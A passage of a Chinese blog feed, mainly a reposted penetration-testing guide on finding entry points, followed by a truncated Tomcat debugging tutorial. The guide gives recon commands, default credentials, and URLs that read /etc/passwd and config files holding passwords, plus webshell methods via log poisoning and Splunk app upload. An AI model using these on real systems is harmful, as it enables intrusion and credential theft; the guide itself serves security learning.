  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术基础</category>
      </categories>
      <tags>
        <tag>技术基础</tag>
        <tag>Java基础</tag>
        <tag>工具利器</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透中寻找突破口的那些事（转载）</title>
    <url>/posts/3841836989/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p>版权声明：本文为CSDN博主「hrayha」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/hrayha/article/details/104887524" target="_blank" rel="noopener">https://blog.csdn.net/hrayha/article/details/104887524</a></p>
<div class="htmledit_views" id="content_views">
                                            <p>注：之前发在乌云drops的一篇文章，汇总了自己对渗透测试中寻找突破口的一些总结，现在乌云drops没有了，所以发在自己blog上。</p>

<p> </p>

<h2><a name="t0"></a><a name="t0"></a><strong><strong><strong>一、寻找目标</strong></strong></strong></h2>

<p style="margin-left:0pt;"><strong><strong>在自己日常检测中以及观察他人检测思路发现前期收集信息具有很关键的作用，很多时候不需要对某种漏洞有很深的研究，如果前期收集了足够多的目标，只需要检测一些常见的高危漏洞即可有收获</strong></strong></p>

<p style="margin-left:0pt;">常用思路</p>

<p style="margin-left:0pt;">1.网段信息</p>

<p style="margin-left:0pt;">1）通过子域名</p>

<p style="margin-left:0pt;">如果存在域传送这种漏洞是最好的，没有的话一般就要暴破子域名了</p>

<p style="margin-left:0pt;">我常用的软件为dnsmap，基本用法</p>

<p style="margin-left:0pt;">./dnsmap target-domain.com -w 你的域名字典 -r 要保存结果文件的绝对路径，针对做了泛解析的域名可以使用-i 需忽略ip来避免误报，如对域名xxx.com的暴破过程中不存在域名都解析到1.1.1.1上，则使用命令为</p>

<p style="margin-left:0pt;">./dnsmap xxx.com -w domain.txt -i 1.1.1.1 -r /tmp/result.txt</p>

<p style="margin-left:0pt;">结果为如下格式:</p>

<p style="margin-left:0pt;"><img alt="" height="546" src="https://img-blog.csdnimg.cn/20200315215908987.png" width="295"></p>

<p style="margin-left:0pt;">其中默认编译的dnsmap存在一个问题，解决方法与其他使用方法请参考</p>

<p style="margin-left:0pt;"><a href="http://pan.baidu.com/s/1nt5HMw5" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>http://pan.baidu.com/s/1nt5HMw5</u></span></u></a></p>

<p style="margin-left:0pt;">大家可以在默认字典的基础上加一些如oa、zabbix、nagios、cacti、erp、sap、crm等等，不少企业都是这种命名方式</p>

<p style="margin-left:0pt;">渗透的话一般会从oa，mail等重要业务网段寻找目标，如果发现有些管理后台的域名为</p>

<p style="margin-left:0pt;">xx.admin.xxx.com这种，则可继续扩展，寻找admin.xxx.com下的三级域名</p>

<p style="margin-left:0pt;">曾检测某站时无意发现一个ntp.nb.xxx.com的域名，进而暴破nb.xxx.com这个域名，结果如下</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315220011661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">其中zabbix.nb.xxx.com这个站点暴露到了外网，版本较低，使用zabbix的注入漏洞成功获取权限</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315220101847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">同时子域名也可通过搜索引擎语法site:xxx.com收集(不断增加条件，可获取的更多，如inurl,intitle等等)</p>

<p>2）AS号</p>

<p style="margin-left:0pt;">Jwhois使用方法</p>

<p style="margin-left:0pt;">yum install -y jwhois安装</p>

<p style="margin-left:0pt;">执行whois -h asn.shadowserver.org origin 1.1.1.1可获得ip所在企业的AS号</p>

<p style="margin-left:0pt;">继续执行whois -h asn.shadowserver.org prefix as号即可获得该as号对应网段</p>

<p style="margin-left:0pt;">注：一般只有大企业才会有as号，并且一个企业可能会有多个as号</p>

<p style="margin-left:0pt;">3）DNS</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315220305728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">4）spf记录</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315220404114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">如何判断cdn？</p>

<p style="margin-left:0pt;">如果误把cdn的ip加到目标里会影响一些人工时间，如何判断cdn？最简单的方法是用多地ping功能</p>

<p style="margin-left:0pt;"><a href="http://ping.chinaz.com/" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>http://ping.chinaz.com/</u></span></u></a></p>

<p style="margin-left:0pt;"><u><span style="color:#0000ff;"><u><img alt="" src="https://img-blog.csdnimg.cn/20200315220540942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></u></span></u></p>

<p style="margin-left:0pt;">2.利用whatweb寻找web入口</p>

<p style="margin-left:0pt;">使用方法</p>

<p style="margin-left:0pt;">./whatweb 1.1.1.1/24 --log-brief=output_file（详细使用参考使用说明）</p>

<p style="margin-left:0pt;">默认的话只识别80端口的，如果此时我们想识别下8080端口，再加上--url-suffix=”:8080”即可</p>

<p style="margin-left:0pt;">可根据title，cms等信息寻找目标，一般把后台或者存在已知漏洞的系统作为目标，同时可寻找nginx低版本存在解析漏洞的站点，受影响版本为0.5全版本，0.6全版本，0.7&lt;=0.7.65，&lt; p&gt;

</p><p style="margin-left:0pt;">0.8&lt;=0.8.37&lt; p&gt;

</p><p style="margin-left:0pt;"><strong><strong>附上一则实例</strong></strong>：</p>

<p style="margin-left:0pt;">在检测某企业时，whatweb批量识别指纹发现存在一台nginx版本比较低且存在解析漏洞的站点，首页为空白页，对目录结构暴破发现.bash_history文件</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315220709719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">操作历史中发现有打包文件且放在web目录下</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315220757616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">下载打包文件，内容如下</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315220852826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">其中发现有log文件，且log文件会记录user-agent信息</p>

<p style="margin-left:0pt;"><img alt="" height="106" src="https://img-blog.csdnimg.cn/20200315220939639.png" width="1053"></p>

<p style="margin-left:0pt;">使用firefox插件User Agent Switcher更改user-agent信息</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315221026174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">一句话代码写入log文件后利用解析漏洞直接获取webshell</p>

<p style="margin-left:0pt;"><img alt="" height="189" src="https://img-blog.csdnimg.cn/20200315221109999.png" width="583"></p>

<p>3.利用nmap寻找可利用服务</p>

<p style="margin-left:0pt;">详细用法参考使用手册，个人常用命令为（-P0参数视情况添加，如果没有禁ping可以不加，提升速度）</p>

<p style="margin-left:0pt;">./nmap -sT -sV 1.1.1.1/24 -P0 -oN /tmp/port_result.txt --open</p>

<p style="margin-left:0pt;"> </p>

<p style="margin-left:0pt;">Ip较少的情况下可以扫全端口以及一些基本信息</p>

<p style="margin-left:0pt;">./nmap -sT -sV -p 1-65535 1.1.1.1 -P0 -A</p>

<p style="margin-left:0pt;"> </p>

<p style="margin-left:0pt;">利用nmap可以发现一些非80/443/8080这种常见端口上的web以及一些容易出问题的端口如</p>

<p style="margin-left:0pt;">873(rsync无验证)/21(ftp匿名账户)/11211(memcache无验证)/27017（mangodb无验证）等，碰到不认识的服务别急着放弃，去exploit-db等站点搜一下是否存在已知漏洞吧，说不准直接找到个RCE呢(很多时候我也会在乌云search一下，搜到的话就是实际例子，看着更直白)</p>

<p style="margin-left:0pt;"> </p>

<p>4.利用搜索引擎寻找后台或重要系统</p>

<p style="margin-left:0pt;">常用搜索语法为site:xxx.com inurl:login</p>

<p style="margin-left:0pt;">Inurl的值可以自由变换，常用的包括admin、manage或者使用intitle:找管理、登录之类的关键字，有些站点出来的结果可能多数为同一站点下的误报，比如博客类的，问问类的，可使用-来减少误报，比如google中搜索site:baidu.com inurl:login -zhidao就可以在结果中去除zhidao相关的结果，百度可输入site:baidu.com inurl:login -site:zhidao.baidu.com</p>

<p style="margin-left:0pt;">实例参考:http://www.wooyun.org/bugs/wooyun-2010-026581</p>

<p style="margin-left:0pt;"> </p>

<p>5.搞一个精简的路径字典</p>

<p style="margin-left:0pt;">我们可以把容易出问题且危害比较高的常见路径做成一个精简的小字典，针对之前收集的域名去遍历，比如/invoker/JMXInvokerServlet、wwwroot.zip这种，发现的话很大几率可以搞到权限</p>

<h2><a name="t1"></a><a name="t1"></a><strong><strong><strong>二、利用</strong></strong></strong></h2>

<p style="margin-left:0pt;"><span style="color:#454545;">这里列出几个常见的系统利用方法</span></p>

<h3><a name="t2"></a><a name="t2"></a><strong><strong><strong>后台</strong></strong></strong></h3>

<p style="margin-left:0pt;">当前面的过程中发现后台或者重要系统时，一般会进行如下几种检测</p>

<ol><li>awvs综合扫描（经常有意外发现）</li>
    <li>目录结构暴破</li>
    <li>口令暴破（admin不行的时候，不一定是密码不对，很多时候是用户名不对，尝试想到的可获取用户名的一切方法，如翻翻js、css文件，html源码注释内容，或者.svn目录下的信息泄露等，密码可针对系统名称及域名等信息做一些变形加到字典中）</li>
    <li>Html源码、js等文件获取信息（有些开发者会把一些管理地址以注释形式放到html源码中，管理的接口地址写在js中，运气好的话可以直接越权访问）</li>
    <li>参数值暴破（一些框架写的后台登陆页面可能是这种格式xx.com/?c=login,日常可以收集一些常见的参数值，如index、main、upload、edit、adduser等、运气好的话可以直接越权操作）</li>
</ol><h3><a name="t3"></a><a name="t3"></a><strong><strong><strong>axis2</strong></strong></strong></h3>

<p style="margin-left:0pt;">文件包含：</p>

<p style="margin-left:0pt;"><a href="http://www.thomas-bayer.com/axis2/services/listServices" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>www.xxx.com/axis2/services/listServices</u></span></u></a> 查看所有services</p>

<p style="margin-left:0pt;"><a href="http://www.thomas-bayer.com/axis2/services/Version?xsd=../conf/axis2.xml" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>www.xxx.com/axis2/services/xxxxx?xsd=../conf/axis2.xml</u></span></u></a>  xxxxx替换任意服务均可，读取axis2配置文件获取后台账户</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315221321733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;"><a href="http://www.thomas-bayer.com/axis2/axis2-admin/" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>www.xxx.com/axis2/axis2-admin/</u></span></u></a>    登陆管理后台</p>

<p style="margin-left:0pt;">后台部署文件代码执行：</p>

<p style="margin-left:0pt;">使用metasploit</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315221417371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<h3><a name="t4"></a><a name="t4"></a><strong><strong><strong>Resin</strong></strong></strong></h3>

<p style="margin-left:0pt;">文件读取：</p>

<p style="margin-left:0pt;"><a href="http://www.xxx.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>http://www.xxx.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd</u></span></u></a></p>

<p style="margin-left:0pt;"><u><span style="color:#0000ff;"><u><img alt="" src="https://img-blog.csdnimg.cn/20200315221506823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></u></span></u></p>

<p style="margin-left:0pt;">也可以通过</p>

<p style="margin-left:0pt;"><a href="http://www.xxx.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>http://www.xxx.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=h</u></span></u></a>ttp://1.1.1.1</p>

<p style="margin-left:0pt;">实现SSRF</p>

<h3><a name="t5"></a><a name="t5"></a><strong><strong><strong>solr敏感信息泄漏</strong></strong></strong></h3>

<p style="margin-left:0pt;"><a href="http://420chan.org:8080/solr/admin/file/?file=solrconfig.xml" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>http://xxx.org:8080/solr/admin/file/?file=solrconfig.xml</u></span></u></a></p>

<p style="margin-left:0pt;">搜索xml文件，找到data-import.xml</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315221624359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">访问 <a href="http://420chan.org:8080/solr/admin/file/?file=data-import.xml" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>http://</u></span></u><u><span style="color:#0000ff;"><u>xxx</u></span></u><u><span style="color:#0000ff;"><u>.org:8080/solr/admin/file/?file=data-import.xml</u></span></u></a> 获取数据库密码</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315221711644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<h3><a name="t6"></a><a name="t6"></a><strong><strong><strong>Hudson（jenkins类似）</strong></strong></strong></h3>

<p style="margin-left:0pt;">参考http://www.wooyun.org/bugs/wooyun-2010-018339</p>

<h3><a name="t7"></a><a name="t7"></a><strong><strong><strong>Zenoss</strong></strong></strong></h3>

<p style="margin-left:0pt;">Google关键字：intitle:"Zenoss Login"</p>

<p style="margin-left:0pt;">默认口令admin/zenoss</p>

<p style="margin-left:0pt;">利用方法参考http://www.wooyun.org/bugs/wooyun-2010-019917</p>

<h3><a name="t8"></a><a name="t8"></a><strong><strong><strong>Zabbix</strong></strong></strong></h3>

<p style="margin-left:0pt;">后台:http://www.xxx.com/zabbix</p>

<p style="margin-left:0pt;">默认密码:admin/zabbix</p>

<p style="margin-left:0pt;">Google:inurl:zabbix/dashboard.php</p>

<p style="margin-left:0pt;">利用方法参考http://www.wooyun.org/bugs/wooyun-2013-036277</p>

<p style="margin-left:0pt;">另外这个zabbix注入的也很多都存在http://drops.wooyun.org/papers/680</p>

<h3><a name="t9"></a><a name="t9"></a><strong><strong><strong>Cacti</strong></strong></strong></h3>

<p style="margin-left:0pt;">默认登陆路径www.xxx.com/cacti/index.php</p>

<p style="margin-left:0pt;">默认密码admin/admin</p>

<p style="margin-left:0pt;">利用方法参考http://www.wooyun.org/bugs/wooyun-2010-02674</p>

<h3><a name="t10"></a><a name="t10"></a><strong><strong><strong>Splunk</strong></strong></strong></h3>

<p style="margin-left:0pt;">默认后台地址:</p>

<p style="margin-left:0pt;"><a href="http://xxx.com:8000/zh-CN/account/login?return_to=%2Fzh-CN%2F" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>http://xxx.com:8000/zh-CN/account/login?return_to=%2Fzh-CN%2F</u></span></u></a></p>

<p style="margin-left:0pt;"><u><span style="color:#0000ff;"><u><img alt="" src="https://img-blog.csdnimg.cn/20200315221842138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></u></span></u></p>

<p style="margin-left:0pt;">默认账户admin/changeme  默认端口8000</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315221924588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">管理器-应用-从文件安装应用处可获得shell</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/2020031522200785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<p style="margin-left:0pt;">msf有利用模块</p>

<p style="margin-left:0pt;">exploit/multi/http/splunk_upload_app_exec</p>

<p style="margin-left:0pt;"><img alt="" src="https://img-blog.csdnimg.cn/20200315222046747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hyYXloYQ==,size_16,color_FFFFFF,t_70"></p>

<h2><a name="t11"></a><a name="t11"></a><strong><strong><strong>结尾</strong></strong></strong></h2>

<p style="margin-left:0pt;">推荐两篇乌云综合性介绍文章</p>

<p style="margin-left:0pt;">1.从乌云看运维安全那点事儿</p>

<p style="margin-left:0pt;"><a href="http://drops.wooyun.org/papers/410" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>http://drops.wooyun.org/papers/410</u></span></u></a></p>

<p style="margin-left:0pt;">2.攻击JavaWeb应用[7]-Server篇[1]</p>

<p style="margin-left:0pt;"><a href="http://drops.wooyun.org/tips/604" target="_blank" rel="nofollow noopener"><u><span style="color:#0000ff;"><u>http://drops.wooyun.org/tips/604</u></span></u></a></p>

<p style="margin-left:0pt;"> </p>
<!--=0.8.37<--><p></p><!--=0.7.65，<--><p></p></div>

<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>思想结晶</tag>
        <tag>突破口</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在IDEA环境中调试Tomcat源代码</title>
    <url>/posts/4044431530/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<h2 id="准备IDEA与Tomcat"><a href="#准备IDEA与Tomcat" class="headerlink" title="准备IDEA与Tomcat"></a>准备IDEA与Tomcat</h2><p>　　1.IDEA在我看来是目前我用过的最舒服的（没有之一）的编译器，去哪下载，怎么安装我在这就不多做阐述了，请自行登梯下载部署配置。<br>　　2.tomcat源码下载的时候选择：apache-tomcat-***-src.zip，以8.5.47版本为例，则下载对应的文件名为：apache-tomcat-8.5.47-src.zip。<br>　　这两部分内容涉及不到任何技术细节，因此不具体提供方法，对我来说这两部分都不是问题，相信大家应该也不成问题。</p>
<h2 id="调试步骤"><a href="#调试步骤" class="headerlink" title="调试步骤"></a>调试步骤</h2><p>具体调试方法如下：</p>
<ol>
<li>下载解压，在其根目录下新建catalina-home文件夹和pom.xml文件，如下图所示。<br>　　<img src="https://img.hacpai.com/file/2020/05/image-ae5c73c9.png" alt="image.png"></li>
<li>把根目录下的conf和webapps复制到catalina-home文件下，其他目录新建即可。<br><img src="https://img.hacpai.com/file/2020/05/image-0e2336e1.png" alt="image.png"></li>
<li>修改第一步新建pom.xml文件，具体内容如下（涉及到版本问题的请自行修改即可）：</li>
</ol>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line">&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;Tomcat8.5.47&lt;/artifactId&gt;</span><br><span class="line">    &lt;name&gt;Tomcat8.5.47&lt;/name&gt;</span><br><span class="line">    &lt;version&gt;8.5.47&lt;/version&gt;</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;finalName&gt;Tomcat8.5.47&lt;/finalName&gt;</span><br><span class="line">        &lt;sourceDirectory&gt;java&lt;/sourceDirectory&gt;</span><br><span class="line">        &lt;testSourceDirectory&gt;test&lt;/testSourceDirectory&gt;</span><br><span class="line">        &lt;resources&gt;</span><br><span class="line">            &lt;resource&gt;</span><br><span class="line">                &lt;directory&gt;java&lt;/directory&gt;</span><br><span class="line">            &lt;/resource&gt;</span><br><span class="line">        &lt;/resources&gt;</span><br><span class="line">        &lt;testResources&gt;</span><br><span class="line">            &lt;testResource&gt;</span><br><span class="line">                &lt;directory&gt;test&lt;/directory&gt;</span><br><span class="line">            &lt;/testResource&gt;</span><br><span class="line">        &lt;/testResources&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;2.0.2&lt;/version&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;encoding&gt;UTF-8&lt;/encoding&gt;</span><br><span class="line">                    &lt;source&gt;1.8&lt;/source&gt;</span><br><span class="line">                    &lt;target&gt;1.8&lt;/target&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.12&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.easymock&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;easymock&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.5&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;ant&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;ant&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.7.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;wsdl4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;wsdl4j&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.6.2&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.xml&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jaxrpc&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.eclipse.jdt.core.compiler&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;ecj&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.6.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></tbody></table></figure>

<ol start="4">
<li>运行idea导入tomcat源码<br><img src="https://img.hacpai.com/file/2020/05/image-0bcb2c79.png" alt="image.png"><br><img src="https://img.hacpai.com/file/2020/05/image-8c0fe535.png" alt="image.png"><br><img src="https://img.hacpai.com/file/2020/05/image-196353c1.png" alt="image.png"></li>
<li>配置tomcat运行环境，以启动tomcat服务器：<br>Main class：Bootstrap（org.apache.catalina.startup）<br>VM options: -Dcatalina.home=”你的路径/apache-tomcat-8.5.47-src/catalina-home”<br>// -D 是java设置参数的固定写法<br>// catalina.home 是参数名<br>// =的后面是tomcat源码项目的catalina-home的路径，当这个路径包含空格是需要使用””<br><img src="https://img.hacpai.com/file/2020/05/image-ae22170f.png" alt="image.png"></li>
<li>编译时，Test模块下的TestCookieFilter.java会报错，注释掉这个类即可<br><img src="https://img.hacpai.com/file/2020/05/image-0856daa6.png" alt="image.png"></li>
</ol>
<p>7.在ContextConfig.java中的webConfig();代码语句后添加代码：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">context.addServletContainerInitializer(new JasperInitializer(),null);</span><br></pre></td></tr></tbody></table></figure>

<p>　ContextConfig.java和Bootstrap主类在同一处，见步骤5<br><img src="https://img.hacpai.com/file/2020/05/image-24e9ba37.png" alt="image.png"><br>8.运行项目，启动成功，访问正常。<br><img src="https://img.hacpai.com/file/2020/05/image-d9280623.png" alt="image.png"><br><img src="https://img.hacpai.com/file/2020/05/image-15bb9ccb.png" alt="image.png"></p>
<h2 id="导入Tomcat9需修改的点"><a href="#导入Tomcat9需修改的点" class="headerlink" title="导入Tomcat9需修改的点"></a>导入Tomcat9需修改的点</h2><ol>
<li>ResponseTrailers 找不到，把 home\webapps\examples\WEB-INF\classes\trailers 目录拷贝到 test 目录下</li>
<li>CookieFilter 找不到，把 home\webapps\examples\WEB-INF\classes\util\CookieFilter.java 文件拷贝到 test\util 目录下</li>
